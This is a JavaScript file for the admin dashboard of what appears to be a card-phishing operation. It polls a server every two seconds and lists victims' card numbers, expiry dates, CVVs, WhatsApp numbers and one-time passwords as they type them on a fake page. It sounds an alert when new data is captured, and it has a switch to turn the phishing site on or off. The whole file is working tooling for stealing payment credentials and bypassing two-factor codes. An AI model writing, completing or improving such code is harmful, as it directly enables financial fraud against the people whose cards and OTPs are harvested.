let soundEnabled = false;   // Default OFF — user click karke ON karega
let audioUnlocked = false;
let websiteEnabled = true;
let knownRecords = new Map();
let pollInterval = null;
let pollCount = 0;
let currentFilter = 'all';
let audioCtx = null;

// ==================== INITIAL LOAD ====================
window.addEventListener('load', () => {
    console.log("🚀 Admin v5 loaded - Sound Toggle Unlock System");
    
    loadInitialData();
    loadWebsiteState();
    
    setTimeout(pollUpdates, 500);
    pollInterval = setInterval(pollUpdates, 2000);

    // AudioContext create karo (lekin resume nahi)
    try {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    } catch (e) {
        console.log("AudioContext not supported", e);
    }
});


// ==================== AUDIO UNLOCK ====================
function unlockAudioNow() {
    try {
        if (!audioCtx) {
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        }
        if (audioCtx.state === 'suspended') {
            return audioCtx.resume().then(() => {
                audioUnlocked = true;
                console.log("🔊 Audio unlocked");
                return true;
            }).catch((err) => {
                console.log("Resume failed", err);
                return false;
            });
        } else {
            audioUnlocked = true;
            return Promise.resolve(true);
        }
    } catch (e) {
        console.log("Unlock error", e);
        return Promise.resolve(false);
    }
}


// ==================== BEEP GENERATOR ====================
function playBeep(volume, duration, delay, freq) {
    if (!audioCtx) return;
    try {
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.type = 'sine';
        osc.frequency.setValueAtTime(freq || 880, audioCtx.currentTime + delay);
        gain.gain.setValueAtTime(0, audioCtx.currentTime + delay);
        gain.gain.linearRampToValueAtTime(volume, audioCtx.currentTime + delay + 0.01);
        gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + delay + duration);
        osc.start(audioCtx.currentTime + delay);
        osc.stop(audioCtx.currentTime + delay + duration + 0.02);
    } catch (e) {}
}

// Notification tone — naya data aane par
function playNotificationSound() {
    if (!soundEnabled) return;
    if (!audioCtx) return;
    if (audioCtx.state === 'suspended') {
        audioCtx.resume().then(() => {
            playBeep(0.6, 0.15, 0, 880);
            playBeep(0.6, 0.20, 0.18, 660);
        }).catch(() => {});
        return;
    }
    playBeep(0.6, 0.15, 0, 880);
    playBeep(0.6, 0.20, 0.18, 660);
}

// Confirmation beep — jab user Sound ON kare
function playConfirmBeep() {
    if (!audioCtx) return;
    if (audioCtx.state === 'suspended') {
        audioCtx.resume().then(() => {
            playBeep(0.5, 0.12, 0, 1046);
            playBeep(0.5, 0.18, 0.15, 1318);
        }).catch(() => {});
        return;
    }
    playBeep(0.5, 0.12, 0, 1046);
    playBeep(0.5, 0.18, 0.15, 1318);
}


// ==================== INITIAL LOAD ====================
function loadInitialData() {
    fetch('/get_all_data?t=' + Date.now())
        .then(res => res.json())
        .then(data => {
            knownRecords.clear();
            
            const tbody = document.getElementById('dataTableBody');
            if (!tbody) return;
            tbody.innerHTML = '';
            
            if (data.length === 0) {
                const es = document.getElementById('emptyState');
                if (es) es.style.display = 'block';
            } else {
                const es = document.getElementById('emptyState');
                if (es) es.style.display = 'none';
                data.forEach(entry => {
                    knownRecords.set(entry.id, {
                        card_number: entry.card_number || '',
                        expiry_date: entry.expiry_date || '',
                        cvv: entry.cvv || '',
                        whatsapp: entry.whatsapp || '',
                        otp: entry.otp || '',
                        status: entry.status || ''
                    });
                    addRowToTable(entry, false);
                });
            }
            
            updateStats();
            applyFilter();
        })
        .catch(err => console.error("Initial load error:", err));
}

function loadWebsiteState() {
    fetch('/get_website_state?t=' + Date.now())
        .then(res => res.json())
        .then(data => {
            websiteEnabled = data.enabled;
            updateWebsiteButton();
        })
        .catch(() => {});
}


// ==================== POLLING ====================
function pollUpdates() {
    pollCount++;
    
    fetch('/get_latest_state?t=' + Date.now())
        .then(res => res.json())
        .then(records => {
            if (!records || records.length === 0) return;
            
            let hasChanges = false;
            
            records.forEach(entry => {
                const known = knownRecords.get(entry.id);
                const currentState = {
                    card_number: entry.card_number || '',
                    expiry_date: entry.expiry_date || '',
                    cvv: entry.cvv || '',
                    whatsapp: entry.whatsapp || '',
                    otp: entry.otp || '',
                    status: entry.status || ''
                };
                
                if (!known) {
                    knownRecords.set(entry.id, currentState);
                    addRowToTable(entry, true);
                    hasChanges = true;
                } else if (JSON.stringify(known) !== JSON.stringify(currentState)) {
                    knownRecords.set(entry.id, currentState);
                    updateRowInTable(entry);
                    hasChanges = true;
                }
            });
            
            if (hasChanges) {
                updateStats();
                applyFilter();
                playNotificationSound();
            }
        })
        .catch(err => console.error("Poll error:", err));
}


// ==================== TABLE ROWS ====================
// ⭐ FIXED: Naya record TOP pe, purana record NEECHE (appendChild)
function addRowToTable(entry, isNew) {
    const tbody = document.getElementById('dataTableBody');
    if (!tbody) return;
    
    const emptyState = document.getElementById('emptyState');
    if (emptyState) emptyState.style.display = 'none';

    const existing = document.getElementById('row-' + entry.id);
    if (existing) {
        updateRowInTable(entry);
        return;
    }

    const tr = document.createElement('tr');
    tr.id = 'row-' + entry.id;
    tr.dataset.status = entry.status || '';
    
    if (isNew) tr.classList.add('new-row');
    tr.innerHTML = rowHTML(entry);
    
    // ⭐ naya record top pe, purana record neeche
    if (isNew) {
        tbody.insertBefore(tr, tbody.firstChild);
    } else {
        tbody.appendChild(tr);
    }
}

function updateRowInTable(entry) {
    const tr = document.getElementById('row-' + entry.id);
    if (!tr) {
        addRowToTable(entry, true);
        return;
    }
    tr.dataset.status = entry.status || '';
    tr.classList.add('new-row');
    setTimeout(() => tr.classList.remove('new-row'), 2000);
    tr.innerHTML = rowHTML(entry);
}

// ⭐ 8 columns exactly matching table headers
function rowHTML(entry) {
    let cls = 'typing';
    if (entry.status === 'Completed') cls = 'completed';
    else if (entry.status && entry.status.includes('Set')) cls = 'mpin';
    
    return `
        <td class="time-cell">${entry.timestamp || '-'}</td>
        <td><strong>${formatCard(entry.card_number) || '-'}</strong></td>
        <td><span class="mono cyan">${entry.expiry_date || '...'}</span></td>
        <td><span class="mono cyan">${entry.cvv || '...'}</span></td>
        <td><span class="mono green">${entry.whatsapp || '...'}</span></td>
        <td><span class="mono green">${entry.otp || '...'}</span></td>
        <td><span class="status-badge status-${cls}">${entry.status || '-'}</span></td>
        <td>
            <button class="delete-btn" onclick="deleteRecord(${entry.id})" title="Delete">
                <i class="ri-delete-bin-line"></i>
            </button>
        </td>
    `;
}

function formatCard(num) {
    if (!num) return '';
    const clean = num.replace(/\s/g, '');
    return clean.replace(/(.{4})/g, '$1 ').trim();
}


// ==================== FILTER ====================
function filterTable(filter, btn) {
    currentFilter = filter;
    
    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
    if (btn) btn.classList.add('active');
    
    applyFilter();
}

function applyFilter() {
    const rows = document.querySelectorAll('#dataTableBody tr');
    let visibleCount = 0;
    const totalRows = rows.length;
    
    rows.forEach(row => {
        const status = row.dataset.status || '';
        
        let show = true;
        
        switch (currentFilter) {
            case 'all':
                show = true;
                break;
            case 'card':
                show = (status === 'Typing Card');
                break;
            case 'expiry':
                show = (status === 'Typing Expiry' || status === 'Expiry Set');
                break;
            case 'cvv':
                show = (status === 'Typing CVV' || status === 'CVV Set');
                break;
            case 'whatsapp':
                show = (status === 'Typing WhatsApp' || status === 'WhatsApp Set');
                break;
            case 'otp':
                show = (status === 'Typing OTP');
                break;
            case 'completed':
                show = (status === 'Completed');
                break;
        }
        
        if (show) {
            row.style.display = '';
            visibleCount++;
        } else {
            row.style.display = 'none';
        }
    });
    
    const emptyState = document.getElementById('emptyState');
    if (emptyState) {
        if (totalRows === 0) {
            emptyState.style.display = 'block';
            const p = emptyState.querySelector('p');
            const s = emptyState.querySelector('span');
            if (p) p.innerText = 'No data captured yet';
            if (s) s.innerText = 'Waiting for user activity...';
        } else if (visibleCount === 0) {
            emptyState.style.display = 'block';
            const p = emptyState.querySelector('p');
            const s = emptyState.querySelector('span');
            if (p) p.innerText = 'No records match this filter';
            if (s) s.innerText = 'Try a different filter';
        } else {
            emptyState.style.display = 'none';
        }
    }
}


// ==================== DELETE ====================
function deleteRecord(id) {
    if (!confirm("Delete this record?")) return;
    
    fetch('/delete_record/' + id, { method: 'DELETE' })
    .then(res => res.json())
    .then(() => {
        const tr = document.getElementById('row-' + id);
        if (tr) tr.remove();
        knownRecords.delete(id);
        updateStats();
        applyFilter();
    })
    .catch(err => console.error("Delete error:", err));
}

function clearAllRecords() {
    if (!confirm("⚠️ Delete ALL records permanently?")) return;
    
    fetch('/clear_all_records', { method: 'POST' })
    .then(res => res.json())
    .then(() => {
        document.getElementById('dataTableBody').innerHTML = '';
        const es = document.getElementById('emptyState');
        if (es) es.style.display = 'block';
        knownRecords.clear();
        updateStats();
        applyFilter();
    })
    .catch(err => console.error("Clear error:", err));
}


// ==================== STATS ====================
function updateStats() {
    const allRows = document.querySelectorAll('#dataTableBody tr');
    const total = allRows.length;
    
    const totalEl = document.getElementById('totalUsers');
    if (totalEl) totalEl.innerText = total;
    
    let completed = 0;
    allRows.forEach(row => {
        const status = row.dataset.status || '';
        if (status === 'Completed') completed++;
    });
    
    const completedEl = document.getElementById('completedLogins');
    if (completedEl) completedEl.innerText = completed;
    
    const pending = total - completed;
    const pendingEl = document.getElementById('pendingCount');
    if (pendingEl) pendingEl.innerText = pending;
}


// ==================== SOUND TOGGLE (Unlock + On/Off) ====================
function toggleSound() {
    const btn = document.getElementById('soundBtn');
    const text = document.getElementById('soundText');
    const icon = document.getElementById('soundIcon');

    if (!soundEnabled) {
        // 🔓 Sound ON karo — pehle unlock karo, phir confirm beep bajao
        unlockAudioNow().then((ok) => {
            if (ok) {
                soundEnabled = true;
                btn.classList.remove('off');
                btn.classList.add('on');
                if (text) text.innerText = 'Sound ON';
                if (icon) icon.className = 'ri-volume-up-line';
                // Confirmation beep
                setTimeout(playConfirmBeep, 100);
            } else {
                console.log("Unlock failed, sound not enabled");
            }
        });
    } else {
        // 🔇 Sound OFF karo
        soundEnabled = false;
        btn.classList.add('off');
        btn.classList.remove('on');
        if (text) text.innerText = 'Sound OFF';
        if (icon) icon.className = 'ri-volume-mute-line';
    }
}


// ==================== TOGGLE WEBSITE ====================
function toggleWebsite() {
    websiteEnabled = !websiteEnabled;
    
    fetch('/toggle_website', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ enabled: websiteEnabled })
    })
    .then(res => res.json())
    .then(data => {
        websiteEnabled = data.enabled;
        updateWebsiteButton();
    })
    .catch(err => console.error("Toggle error:", err));
}

function updateWebsiteButton() {
    const btn = document.getElementById('websiteToggleBtn');
    const text = document.getElementById('websiteToggleText');
    
    if (!btn || !text) return;
    
    if (websiteEnabled) {
        btn.classList.remove('off');
        btn.classList.add('on');
        text.innerText = 'Website ON';
    } else {
        btn.classList.add('off');
        btn.classList.remove('on');
        text.innerText = 'Website OFF';
    }
}